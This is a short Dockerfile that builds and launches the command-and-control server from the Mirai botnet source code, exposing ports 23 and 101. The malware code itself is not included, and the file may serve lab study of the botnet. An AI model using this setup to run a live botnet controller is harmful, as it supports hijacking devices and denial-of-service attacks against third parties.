FROM debian:bullseye

RUN apt update && apt install -y golang git tcpdump

WORKDIR /app

COPY ./Mirai-Source-Code/mirai/cnc /app/cnc

RUN cd /app/cnc && go mod tidy
RUN cd /app/cnc && go build -o ../debug/cnc *.go

EXPOSE 23
EXPOSE 101

CMD ["./debug/cnc"]